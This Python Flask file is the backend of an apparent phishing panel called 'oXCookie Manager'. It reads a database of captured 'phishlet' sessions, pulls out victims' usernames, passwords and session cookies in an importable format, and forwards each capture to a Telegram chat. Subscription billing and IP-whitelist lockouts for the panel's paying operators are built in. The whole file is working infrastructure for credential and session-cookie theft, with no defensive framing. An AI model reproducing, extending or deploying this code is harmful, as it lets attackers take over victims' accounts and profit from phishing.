                                "*🎉 Subscription Extended\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Account:* `{username}`\n*Days Added:* `{days_added}`\n*New Expiry Date:* `{expiry_date}`\n*Status:* `{status}`\n━━━━━━━━━━━━━━━━━━━━")
                            
                            from datetime import datetime
                            expiry_date_str = updated_user.get("subscription_expires", "N/A")
                            try:
                                expiry_date = datetime.fromisoformat(expiry_date_str)
                                expiry_date_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
                            except:
                                pass
                            
                            message = extension_template.replace("{username}", escape_markdownv2(username))
                            message = message.replace("{days_added}", str(days_added))
                            message = message.replace("{expiry_date}", escape_markdownv2(expiry_date_str))
                            message = message.replace("{status}", escape_markdownv2(updated_user.get("subscription_status", "active")))
                            
                            safe_print(f"[DEBUG] Extension notification message: {message[:150]}...")
                            result = send_telegram_notification(
                                config.get("telegr_chatid"),
                                config.get("telegram_token"),
                                message,
                                file_path=None,
                                support_telegram=support_telegram
                            )
                            if result:
                                safe_print(f"[OK] Extension notification sent successfully")
                            else:
                                safe_print(f"[ERROR] Extension notification failed to send")
                        except Exception as e:
                            safe_print(f"[ERROR] Error sending extension notification: {e}")
                            import traceback
                            try:
                                safe_print(f"[ERROR] Traceback: {traceback.format_exc()}")
                            except:
                                print(f"[ERROR] Traceback: (error printing traceback)")
                    else:
                        safe_print(f"[DEBUG] Extension notification skipped: subscription_days={subscription_days}, days_added={days_added}, updated_user={updated_user is not None}")
                    
                    # Send notification if status changed
                    if subscription_status and subscription_status != old_status and updated_user:
                        try:
                            # Get notification template
                            if subscription_status == "expired":
                                message = config.get("notification_subscription_warning", 
                                    "*⏰ Subscription Expiring Soon\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Account:* `{username}`\n*Current Status:* `{status}`\n*Expiry Date:* `{expiry_date}`\n*Days Remaining:* `{days_remaining}`\n\nPlease contact support to renew your subscription\\.\n━━━━━━━━━━━━━━━━━━━━")
                                message = message.replace("{username}", escape_markdownv2(username))
                                message = message.replace("{status}", "expired")
                                message = message.replace("{expiry_date}", escape_markdownv2(updated_user.get("subscription_expires", "N/A")))
                                message = message.replace("{days_remaining}", "0")
                            elif subscription_status == "suspended":
                                message = f"*⚠️ Account Suspended\\!*\n\nYour account has been suspended\\. Please contact support for assistance\\."
                                message = message.replace("{username}", escape_markdownv2(username))
                                message = message.replace("{status}", "suspended")
                            else:  # active
                                message = f"*✅ Account Activated\\!*\n\nYour account has been activated\\. You can now access the system\\."
                                message = message.replace("{username}", escape_markdownv2(username))
                                message = message.replace("{status}", "active")
                            
                            send_telegram_notification(
                                config.get("telegr_chatid"),
                                config.get("telegram_token"),
                                message,
                                file_path=None,
                                support_telegram=support_telegram
                            )
                        except Exception as e:
                            safe_print(f"Error sending status change notification: {e}")
            except Exception as e:
                safe_print(f"Error in notification sending: {e}")
            
            return jsonify({"status": "success", "message": "Admin updated successfully"})
        else:
            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/admins/<username>', methods=['DELETE'])
@super_admin_required
def delete_admin(username):
    """Delete admin user"""
    try:
        auth_data = load_auth()
        users = auth_data.get("users", [])
        
        # Don't allow deleting super_admin
        original_count = len(users)
        users = [u for u in users if not (u.get('username') == username and u.get('role') != 'super_admin')]
        
        if len(users) == original_count:
            return jsonify({"status": "error", "message": "User not found or cannot delete super admin"}), 404
        
        auth_data["users"] = users
        if save_auth(auth_data):
            return jsonify({"status": "success", "message": "Admin deleted successfully"})
        else:
            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/admins/<username>/ip-whitelist', methods=['GET'])
@super_admin_required
def get_user_ip_whitelist(username):
    """Get allowed IPs for a user"""
    try:
        auth_data = load_auth()
        users = auth_data.get("users", [])
        
        user = next((u for u in users if u.get('username') == username), None)
        if not user:
            return jsonify({"status": "error", "message": "User not found"}), 404
        
        return jsonify({
            "status": "success",
            "username": username,
            "allowed_ips": user.get('allowed_ips', []),
            "account_locked": user.get('account_locked', False),
            "lock_reason": user.get('lock_reason', ''),
            "locked_at": user.get('locked_at', ''),
            "failed_ip_attempts": user.get('failed_ip_attempts', {})
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/admins/<username>/ip-whitelist', methods=['POST'])
@super_admin_required
def set_user_ip_whitelist(username):
    """Set allowed IPs for a user"""
    try:
        data = request.json
        allowed_ips = data.get('allowed_ips', [])
        
        if not isinstance(allowed_ips, list):
            return jsonify({"status": "error", "message": "allowed_ips must be a list"}), 400
        
        auth_data = load_auth()
        users = auth_data.get("users", [])
        
        user_found = False
        for user in users:
            if user.get('username') == username:
                user_found = True
                user['allowed_ips'] = allowed_ips
                # Clear failed attempts when IPs are updated
                user['failed_ip_attempts'] = {}
                break
        
        if not user_found:
            return jsonify({"status": "error", "message": "User not found"}), 404
        
        auth_data["users"] = users
        if save_auth(auth_data):
            return jsonify({
                "status": "success", 
                "message": f"IP whitelist updated for {username}",
                "allowed_ips": allowed_ips
            })
        else:
            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/admins/locked-accounts', methods=['GET'])
@super_admin_required
def get_locked_accounts():
    """Get all locked accounts"""
    try:
        auth_data = load_auth()
        users = auth_data.get("users", [])
        
        locked_accounts = []
        for user in users:
            if user.get('account_locked', False):
                locked_accounts.append({
                    "username": user.get('username'),
                    "role": user.get('role'),
                    "lock_reason": user.get('lock_reason', ''),
                    "locked_at": user.get('locked_at', ''),
                    "failed_ip_attempts": user.get('failed_ip_attempts', {}),
                    "allowed_ips": user.get('allowed_ips', [])
                })
        
        return jsonify({
            "status": "success",
            "locked_accounts": locked_accounts,
            "count": len(locked_accounts)
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/admins/<username>/restore-access', methods=['POST'])
@super_admin_required
def restore_user_access(username):
    """Restore access for a locked user and optionally add new IP"""
    try:
        data = request.json
        new_ip = data.get('new_ip', None)  # Optional: add new IP to whitelist
        
        auth_data = load_auth()
        users = auth_data.get("users", [])
        
        user_found = False
        for user in users:
            if user.get('username') == username:
                user_found = True
                
                # Unlock account
                user['account_locked'] = False
                user.pop('lock_reason', None)
                user.pop('locked_at', None)
                user['failed_ip_attempts'] = {}  # Clear failed attempts
                
                # Add new IP to whitelist if provided
                if new_ip:
                    allowed_ips = user.get('allowed_ips', [])
                    if new_ip not in allowed_ips:
                        allowed_ips.append(new_ip)
                        user['allowed_ips'] = allowed_ips
                
                break
        
        if not user_found:
            return jsonify({"status": "error", "message": "User not found"}), 404
        
        auth_data["users"] = users
        if save_auth(auth_data):
            # Send notification to user that access has been restored
            try:
                config = load_config()
                if config.get("telegram_enable") and config.get("telegram_token") and config.get("telegr_chatid"):
                    support_telegram = config.get("support_telegram")
                    
                    # Get customizable restore notification template
                    restore_template = config.get("notification_account_restore",
                        "✅ *Account Access Restored\\!*\n\nYour account access has been restored\\.\n\nUser: *{username}*{new_ip_section}\n\nYou can now log in again\\.")
                    
                    # Format message with placeholders
                    new_ip_section = ""
                    if new_ip:
                        new_ip_section = f"\n\nNew IP address `{new_ip}` has been added to your whitelist\\."
                    
                    restore_message = restore_template.replace("{username}", escape_markdownv2(username))
                    restore_message = restore_message.replace("{new_ip_section}", new_ip_section)
                    
                    from notifications import send_telegram_notification
                    send_telegram_notification(
                        chat_id=config.get("telegr_chatid"),
                        token=config.get("telegram_token"),
                        message=restore_message,
                        support_telegram=support_telegram
                    )
                    safe_print(f"[RESTORE] Notification sent to {username}")
            except Exception as e:
                safe_print(f"[RESTORE] Error sending notification: {e}")
            
            message = f"Access restored for {username}"
            if new_ip:
                message += f" and IP {new_ip} added to whitelist"
            
            return jsonify({
                "status": "success",
                "message": message,
                "username": username,
                "account_locked": False,
                "allowed_ips": user.get('allowed_ips', [])
            })
        else:
            return jsonify({"status": "error", "message": "Failed to save changes"}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/maintenance', methods=['GET'])
@login_required
def get_maintenance_message():
    """Get maintenance message"""
    config = load_config()
    return jsonify({
        "message": config.get("maintenance_message", ""),
        "enabled": config.get("maintenance_enabled", False)
    })

@app.route('/api/maintenance', methods=['POST'])
@super_admin_required
def update_maintenance_message():
    """Update maintenance message"""
    try:
        data = request.json
        config = load_config()
        old_enabled = config.get("maintenance_enabled", False)
        old_message = config.get("maintenance_message", "")
        
        config["maintenance_message"] = data.get("message", "")
        config["maintenance_enabled"] = data.get("enabled", False)
        
        if save_config(config):
            # Send notification to all normal admins if maintenance is enabled or message changed
            if config.get("maintenance_enabled") and config.get("maintenance_message"):
                try:
                    if config.get("telegram_enable") and config.get("telegram_token") and config.get("telegr_chatid"):
                        # Get all normal admins
                        auth_data = load_auth()
                        normal_admins = [u for u in auth_data.get("users", []) if u.get("role") == "admin"]
                        
                        # Send maintenance notification to each admin
                        maintenance_message = f"*⚠️ Maintenance Alert\\!*\n\n{escape_markdownv2(config.get('maintenance_message', ''))}"
                        support_telegram = config.get("support_telegram")
                        
                        # Send to main chat (can be extended to per-user chat IDs)
                        send_telegram_notification(
                            config.get("telegr_chatid"),
                            config.get("telegram_token"),
                            maintenance_message,
                            file_path=None,
                            support_telegram=support_telegram
                        )
                except Exception as e:
                    print(f"Error sending maintenance notification: {e}")
            
            return jsonify({"status": "success", "message": "Maintenance message updated"})
        else:
            return jsonify({"status": "error", "message": "Failed to save"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/notifications', methods=['GET'])
@super_admin_required
def get_notification_settings():
    """Get notification text settings"""
    config = load_config()
    return jsonify({
        "incoming_cookie": config.get("notification_incoming_cookie", "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━"),
        "status_update": config.get("notification_status_update", "*⚙️ System Status Changed*\n\n━━━━━━━━━━━━━━━━━━━━\n*Current Status:*\n• *Monitoring:* `{monitoring_status}`\n• *Telegram:* `{telegram_status}`\n• *Discord:* `{discord_status}`\n• *Email:* `{email_status}`\n*Admin Information:*\n• *Admin Status:* `{admin_status}`\n• *Subscription End Date:* `{subscription_end_date}`\n• *Updated At:* `{time}`\n━━━━━━━━━━━━━━━━━"),
        "subscription_warning": config.get("notification_subscription_warning", "*⏰ Subscription Expiring Soon\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Account:* `{username}`\n*Current Status:* `{status}`\n*Expiry Date:* `{expiry_date}`\n*Days Remaining:* `{days_remaining}`\n\nPlease contact support to renew your subscription\\.\n━━━━━━━━━━━━━━━━━━━━"),
        "account_extension": config.get("notification_account_extension", "*🎉 Subscription Extended\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Account:* `{username}`\n*Days Added:* `{days_added}`\n*New Expiry Date:* `{expiry_date}`\n*Status:* `{status}`\n━━━━━━━━━━━━━━━━━━━━"),
        "startup": config.get("notification_startup", "*🚀 oXCookie Manager Started\\!*\n\nSystem is now online and ready to monitor sessions\\."),
        "ip_warning_first": config.get("ip_warning_first", "⚠️ *First Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your first warning\\. Please use an authorized IP address\\.\n\nRemaining attempts: *2*"),
        "ip_warning_second": config.get("ip_warning_second", "🔴 *Second Warning*\n\nUnauthorized IP access attempt detected for user: *{username}*\n\nIP Address: `{ip}`\n\nThis is your second warning\\. One more unauthorized attempt will result in account lockout\\.\n\nRemaining attempts: *1*"),
        "ip_warning_locked": config.get("ip_warning_locked", "🚫 *Account Locked*\n\nYour account has been locked due to unauthorized IP access attempts\\.\n\nUser: *{username}*\nUnauthorized IP: `{ip}`\n\nYour account has been locked after 3 unauthorized IP access attempts\\. Please contact support to restore access\\."),
        "account_restore": config.get("notification_account_restore", "✅ *Account Access Restored\\!*\n\nYour account access has been restored\\.\n\nUser: *{username}*{new_ip_section}\n\nYou can now log in again\\.")
    })

@app.route('/api/notifications', methods=['POST'])
@super_admin_required
def update_notification_settings():
    """Update notification text settings"""
    try:
        data = request.json
        config = load_config()
        config["notification_incoming_cookie"] = data.get("incoming_cookie", "")
        config["notification_status_update"] = data.get("status_update", "")
        config["notification_subscription_warning"] = data.get("subscription_warning", "")
        config["notification_account_extension"] = data.get("account_extension", "")
        config["notification_startup"] = data.get("startup", "")
        config["ip_warning_first"] = data.get("ip_warning_first", "")
        config["ip_warning_second"] = data.get("ip_warning_second", "")
        config["ip_warning_locked"] = data.get("ip_warning_locked", "")
        config["notification_account_restore"] = data.get("account_restore", "")
        
        if save_config(config):
            return jsonify({"status": "success", "message": "Notification settings updated"})
        else:
            return jsonify({"status": "error", "message": "Failed to save"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/notifications/test-session', methods=['POST'])
@super_admin_required
def test_session_notification():
    """Test session notification by sending the most recent session"""
    try:
        config = load_config()
        
        # Check if Telegram is configured
        if not config.get("telegram_enable") or not config.get("telegram_token") or not config.get("telegr_chatid"):
            return jsonify({
                "status": "error",
                "message": "Telegram is not configured. Please configure Telegram settings first."
            }), 400
        
        # Get database path (use same key as rest of the app: dbfile_path)
        db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
        # Clean up path (same as get_sessions route)
        db_path = str(db_path).strip()
        db_path = os.path.normpath(db_path)
        
        print(f"[TEST] Using database path: {db_path}")
        print(f"[TEST] Config dbfile_path: {config.get('dbfile_path', 'NOT SET')}")
        print(f"[TEST] File exists: {os.path.exists(db_path)}")
        
        # Check if database file exists
        if not os.path.exists(db_path):
            return jsonify({
                "status": "error",
                "message": f"Database file not found at: {db_path}. Please configure the database path in settings (Settings > Database Path).",
                "db_path": db_path,
                "config_key": "dbfile_path",
                "config_value": config.get("dbfile_path", "NOT SET")
            }), 404
        
        # Get all sessions (same method as dashboard uses)
        print(f"[TEST] Fetching sessions from database...")
        all_sessions = get_all_sessions(db_path, limit=100)  # Get more sessions to ensure we find one
        
        print(f"[TEST] Found {len(all_sessions) if all_sessions else 0} session(s) in database")
        
        if not all_sessions or len(all_sessions) == 0:
            return jsonify({
                "status": "error",
                "message": f"No sessions found in database at {db_path}. Please capture a session first."
            }), 404
        
        # Get the most recent session (first in the list, sorted by ID descending)
        latest_session = all_sessions[0]
        
        print(f"[TEST] Latest session ID: {latest_session.get('id', 'N/A')}")
        print(f"[TEST] Latest session username: {latest_session.get('username', 'N/A')}")
        
        if not latest_session or latest_session.get("id", 0) == 0:
            return jsonify({
                "status": "error",
                "message": "No valid sessions found in database. Please capture a session first."
            }), 404
        
        # Send test notification using the most recent session
        print(f"[TEST] Sending test notification for session ID: {latest_session.get('id', 0)}")
        
        # Call send_notifications and check if it succeeds by calling send_telegram_notification directly
        # This way we can return proper success/error status
        try:
            # Format the notification message (same as send_notifications does)
            notification_template = config.get("notification_incoming_cookie", 
                "*🍪 New Cookie Session Captured\\!*\n\n━━━━━━━━━━━━━━━━━━━━\n*Session Details:*\n• *ID:* `{session_id}`\n• *Username:* `{username}`\n• *Password:* `{password}`\n• *Remote IP:* `{remote_addr}`\n• *User Agent:* `{useragent}`\n• *Timestamp:* `{time}`\n━━━━━━━━━━━━━━━━━━━━")
            
            from datetime import datetime
            session_id = latest_session.get("id", 0)
            username = latest_session.get("username", "N/A")
            password = latest_session.get("password", "N/A")
            remote_addr = latest_session.get("remote_addr", "N/A")
            useragent = latest_session.get("useragent", "N/A")
            create_time = latest_session.get("create_time", 0)
            
            if create_time:
                try:
                    time_str = datetime.fromtimestamp(create_time).strftime("%Y-%m-%d %H:%M:%S")
                except:
                    time_str = str(create_time)
            else:
                time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Replace placeholders
            message = notification_template.replace("{session_id}", escape_markdownv2(str(session_id)))
            message = message.replace("{username}", escape_markdownv2(username))
            message = message.replace("{password}", escape_markdownv2(password))
            message = message.replace("{remote_addr}", escape_markdownv2(remote_addr))
            message = message.replace("{useragent}", escape_markdownv2(useragent))
            message = message.replace("{time}", escape_markdownv2(time_str))
            
            # Send notification directly to check success
            web_url = config.get("web_url", "http://localhost:5004")
            support_telegram = config.get("support_telegram")
            
            message_id = send_telegram_notification(
                config.get("telegr_chatid"),
                config.get("telegram_token"),
                message,
                file_path=None,
                session_id=session_id,
                web_url=web_url,
                support_telegram=support_telegram
            )
            
            if message_id:
                return jsonify({
                    "status": "success",
                    "message": f"Test notification sent successfully using session ID: {latest_session.get('id', 0)}",
                    "session_id": latest_session.get('id', 0),
                    "username": latest_session.get('username', 'N/A'),
                    "message_id": message_id
                })
            else:
                return jsonify({
                    "status": "error",
                    "message": "Failed to send test notification. The notification was not sent. Check server logs for details.",
                    "session_id": latest_session.get('id', 0),
                    "username": latest_session.get('username', 'N/A')
                }), 500
        except Exception as e:
            safe_print(f"[TEST] Error in test notification: {e}")
            return jsonify({
                "status": "error",
                "message": f"Error sending test notification: {str(e)}",
                "session_id": latest_session.get('id', 0),
                "username": latest_session.get('username', 'N/A')
            }), 500
        
    except Exception as e:
        import traceback
        safe_print(f"[TEST] Error sending test notification: {e}")
        try:
            safe_print(f"[TEST] Traceback: {traceback.format_exc()}")
        except:
            print(f"[TEST] Traceback: (error printing traceback)")
        return jsonify({
            "status": "error",
            "message": f"Failed to send test notification: {str(e)}"
        }), 500

@app.route('/api/send-subscription-notification', methods=['POST'])
@super_admin_required
def send_subscription_notification():
    """Send subscription warning/expiry/suspended notification to a specific admin"""
    try:
        data = request.json
        admin_username = data.get("username")
        notification_type = data.get("type", "warning")  # "warning", "expired", "suspended"
        
        if not admin_username:
            return jsonify({"status": "error", "message": "Username required"}), 400
        
        # Load config and auth
        config = load_config()
        auth_data = load_auth()
        
        # Find the admin user
        user = None
        for u in auth_data.get("users", []):
            if u.get("username") == admin_username:
                user = u
                break
        
        if not user:
            return jsonify({"status": "error", "message": "Admin user not found"}), 404
        
        # Get admin's Telegram chat ID (if available) or use default chat ID
        chat_id = config.get("telegr_chatid")  # For now, send to main chat. Can be extended to per-user chat IDs
        
        if not config.get("telegram_enable") or not config.get("telegram_token") or not chat_id:
            return jsonify({"status": "error", "message": "Telegram not configured"}), 400
        
        # Get notification message
        if notification_type == "expired":
            message = config.get("notification_subscription_warning", "Your subscription has expired. Please contact support for renewal.")
            message = message.replace("{username}", user.get("username", ""))
            message = message.replace("{expiry_date}", user.get("subscription_expires", "N/A"))
            message = message.replace("{status}", "expired")
        elif notification_type == "suspended":
            message = f"*⚠️ Account Suspended\\!*\n\nYour account has been suspended\\. Please contact support for assistance\\."
            message = message.replace("{username}", user.get("username", ""))
            message = message.replace("{status}", "suspended")
        else:  # warning
            message = config.get("notification_subscription_warning", "Your subscription will expire soon. Please renew to continue using the service.")
            message = message.replace("{username}", user.get("username", ""))
            message = message.replace("{expiry_date}", user.get("subscription_expires", "N/A"))
            message = message.replace("{status}", user.get("subscription_status", "active"))
        
        # Get support Telegram
        support_telegram = config.get("support_telegram")
        
        # Send notification
        message_id = send_telegram_notification(
            chat_id,
            config.get("telegram_token"),
            message,
            file_path=None,  # No file for subscription notifications
            support_telegram=support_telegram
        )
        
        if message_id:
            return jsonify({"status": "success", "message": "Notification sent successfully"})
        else:
            return jsonify({"status": "error", "message": "Failed to send notification"}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/database/raw', methods=['GET'])
@login_required
def get_raw_database():
    """Get raw database data for inspection"""
    try:
        config = load_config()
        db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
        # Clean up path (same as get_sessions route)
        db_path = str(db_path).strip()
        db_path = os.path.normpath(db_path)
        
        print(f"[DB Viewer] Database path: {db_path}")
        print(f"[DB Viewer] File exists: {os.path.exists(db_path)}")
        print(f"[DB Viewer] Current working directory: {os.getcwd()}")
        
        if not os.path.exists(db_path):
            print(f"[DB Viewer] Database file not found at: {db_path}")
            return jsonify({"error": f"Database file not found at: {db_path}. Please configure the database path in settings."}), 404
        
        print(f"[DB Viewer] Reading database file...")
        
        # Read all sessions with all their entries (not merged)
        sessions_data = []
        try:
            with open(db_path, 'r', encoding='utf-8', errors='ignore') as file:
                lines = file.readlines()
            
            print(f"[DB Viewer] Read {len(lines)} lines from database")
            
            i = 0
            entry_count = 0
            while i < len(lines):
                line = lines[i].strip()
                
                # Look for "sessions:X" pattern
                if line.startswith("sessions:") and not line.startswith("sessions:0:id"):
                    session_key = line
                    if ":id" in session_key or ":0:" in session_key:
                        i += 1
                        continue
                    
                    # Get length indicator and JSON line
                    if i + 1 < len(lines) and i + 2 < len(lines):
                        length_line = lines[i + 1].strip()
                        json_line = lines[i + 2].strip()
                        
                        if length_line.startswith("$") and json_line.startswith("{"):
                            try:
                                session = json.loads(json_line)
                                session_id = session.get("id")
                                entry_count += 1
                                
                                # Count cookies in each token source
                                tokens_count = sum(len(cookies) for cookies in session.get("tokens", {}).values()) if session.get("tokens") else 0
                                http_tokens_count = sum(len(cookies) for cookies in session.get("http_tokens", {}).values()) if session.get("http_tokens") else 0
                                body_tokens_count = sum(len(cookies) for cookies in session.get("body_tokens", {}).values()) if session.get("body_tokens") else 0
                                
                                sessions_data.append({
                                    "id": session_id,
                                    "update_time": session.get("update_time"),
                                    "create_time": session.get("create_time"),
                                    "username": session.get("username", ""),
                                    "password": session.get("password", ""),
                                    "phishlet": session.get("phishlet", ""),
                                    "tokens_domains": list(session.get("tokens", {}).keys()),
                                    "tokens_count": tokens_count,
                                    "http_tokens_count": http_tokens_count,
                                    "body_tokens_count": body_tokens_count,
                                    "total_cookies": tokens_count + http_tokens_count + body_tokens_count,
                                    "tokens_detail": session.get("tokens", {}),
                                    "http_tokens_detail": session.get("http_tokens", {}),
                                    "body_tokens_detail": session.get("body_tokens", {}),
                                    "raw_data": session
                                })
                            except json.JSONDecodeError as e:
                                print(f"[DB Viewer] JSON decode error at line {i+3}: {str(e)[:100]}")
                                pass
                    i += 3
                    continue
                i += 1
            
            print(f"[DB Viewer] Found {entry_count} session entries")
            
            # Sort by session ID and update_time
            sessions_data.sort(key=lambda x: (x["id"] or 0, x.get("update_time", 0)))
            
            return jsonify({
                "sessions": sessions_data,
                "total_entries": len(sessions_data)
            })
        except Exception as e:
            import traceback
            print(f"[DB Viewer] Error reading database: {str(e)}")
            print(traceback.format_exc())
            return jsonify({"error": f"Error reading database: {str(e)}"}), 500
            
    except Exception as e:
        import traceback
        print(f"[DB Viewer] Exception: {str(e)}")
        print(traceback.format_exc())
        return jsonify({"error": str(e)}), 500

@app.route('/api/sessions/<int:session_id>/cookies', methods=['GET'])
@login_required
def get_session_cookies(session_id):
    """Extract cookies for a specific session using Go monitor logic"""
    try:
        config = load_config()
        db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
        db_path = os.path.normpath(str(db_path).strip())
        
        if not os.path.exists(db_path):
            return jsonify({"error": f"Database file not found at: {db_path}"}), 404
        
        # Get all sessions and find the one we need
        sessions = get_all_sessions(db_path, limit=1000)
        session = None
        
        # Debug: Log available session IDs
        available_ids = [s.get('id') for s in sessions]
        print(f"[COOKIES] Looking for session ID: {session_id} (type: {type(session_id)})")
        print(f"[COOKIES] Available session IDs: {available_ids}")
        
        # Find session - handle both int and string comparisons
        for s in sessions:
            session_id_in_db = s.get('id')
            # Compare as both int and string to handle type mismatches
            if session_id_in_db == session_id or str(session_id_in_db) == str(session_id) or int(session_id_in_db) == int(session_id):
                session = s
                print(f"[COOKIES] Found session {session_id_in_db}, using it for extraction")
                break
        
        if not session:
            print(f"[COOKIES] ERROR: Session {session_id} not found in {len(sessions)} sessions")
            return jsonify({"error": f"Session {session_id} not found. Available IDs: {available_ids}"}), 404
        
        # Extract cookies using EXACT same logic as test-go-extraction.py
        # This ensures we get complete cookies just like the Go monitor
        
        # Get token sources (EXACT same as test script)
        tokens = session.get("tokens") or {}
        http_tokens = session.get("http_tokens") or {}
        body_tokens = session.get("body_tokens") or {}
        custom = session.get("custom") or {}
        
        # Convert to JSON strings (EXACT same as test script)
        tokens_json = json.dumps(tokens, indent=2)
        http_tokens_json = json.dumps(http_tokens, indent=2)
        body_tokens_json = json.dumps(body_tokens, indent=2)
        custom_json = json.dumps(custom, indent=2)
        
        # Process all tokens (EXACT same as test script)
        all_tokens = process_all_tokens(tokens_json, http_tokens_json, body_tokens_json, custom_json)
        
        # Format cookies EXACTLY like test script (field order: path, domain, expirationDate, value, name, httpOnly, hostOnly, secure, session)
        formatted_cookies = []
        for token in all_tokens:
            # EXACT same formatting as test script line 106-116
            cookie_obj = {
                "path": token.get("path", "/"),
                "domain": token.get("domain", ""),
                "expirationDate": token.get("expirationDate", 1795892397),
                "value": token.get("value", ""),
                "name": token.get("name", ""),
                "httpOnly": token.get("httpOnly", False),
                "hostOnly": token.get("hostOnly", False),
                "secure": token.get("secure", False),
                "session": token.get("session", False)
            }
            formatted_cookies.append(cookie_obj)
        
        # Debug log
        print(f"[COOKIES] Session {session_id}: Extracted {len(formatted_cookies)} cookies (same logic as test script)")
        
        # Return JSON - Flask's jsonify preserves all characters by default
        # All special characters (&, !, *, $, etc.) are preserved exactly as stored in database
        return jsonify({
            "session_id": session_id,
            "cookies": formatted_cookies,
            "count": len(formatted_cookies)
        })
        
    except Exception as e:
        print(f"[COOKIES] Error extracting cookies: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500

def startup_check():
    """Check database and routes on startup"""
    print("\n" + "=" * 60)
    print("STARTUP CHECKS")
    print("=" * 60)
    
    # Check config directory
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    print(f"[OK] Config directory: {CONFIG_DIR}")
    
    # Check auth
    auth = load_auth()
    print(f"[OK] Auth initialized: username={auth.get('username')}")
    
    # Check database
    config = load_config()
    db_path = config.get("dbfile_path", DEFAULT_DB_PATH)
    # Clean up path (remove extra spaces, normalize)
    db_path = str(db_path).strip()
    print(f"[OK] Database path: {db_path}")
    
    if os.path.exists(db_path):
        print(f"[OK] Database file exists")
        try:
            # Test reading sessions
            sessions = get_all_sessions(db_path, limit=10)
            print(f"[OK] Database readable: Found {len(sessions)} sessions")
            if len(sessions) > 0:
                print(f"  - Sample session ID: {sessions[0].get('id')}")
                print(f"  - Sample username: {sessions[0].get('username', 'N/A')}")
        except Exception as e:
            print(f"[ERROR] Database read error: {e}")
            import traceback
            traceback.print_exc()
    else:
        print(f"[ERROR] Database file NOT found at: {db_path}")
        print(f"  Please configure the database path in the web interface")
    
    # Check routes
    print("\nRegistered routes:")
    for rule in sorted(app.url_map.iter_rules(), key=lambda x: x.rule):
        if not rule.rule.startswith('/static'):
            methods = ', '.join(sorted(rule.methods - {'HEAD', 'OPTIONS'}))
            print(f"  [OK] {rule.rule} [{methods}]")
    
    print("=" * 60 + "\n")

def send_startup_notification():
    """Send startup notification to Telegram"""
    try:
        config = load_config()
        
        # Check if Telegram is enabled
        if not config.get("telegram_enable") or not config.get("telegram_token") or not config.get("telegr_chatid"):
            return
        
        # Get startup message template from config
        startup_message = config.get("notification_startup", 
            "*🚀 oXCookie Manager Started\\!*\n\nSystem is now online and ready to monitor sessions\\.")
        
        # Send notification
        message_id = send_telegram_notification(
            config.get("telegr_chatid"),
            config.get("telegram_token"),
            startup_message,
            file_path=None,  # No file for startup
            support_telegram=config.get("support_telegram")
        )
        
        if message_id:
            print("[OK] Startup notification sent to Telegram")
        else:
            print("[WARNING] Failed to send startup notification")
    except Exception as e:
        print(f"[WARNING] Error sending startup notification: {e}")

if __name__ == '__main__':
    # Create config directory
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    
    # Initialize auth if needed
    load_auth()
    
    # Send startup notification
    send_startup_notification()
    
    # Run startup checks
    startup_check()
    
    print("=" * 60)
    print("Starting Flask Admin Interface...")
    print(f"Access at: http://localhost:5004")
    print(f"Default login: admin / admin123")
    print("WARNING: CHANGE DEFAULT PASSWORD IMMEDIATELY!")
    print("=" * 60)
    print()
    
    app.run(host='0.0.0.0', port=5004, debug=False)

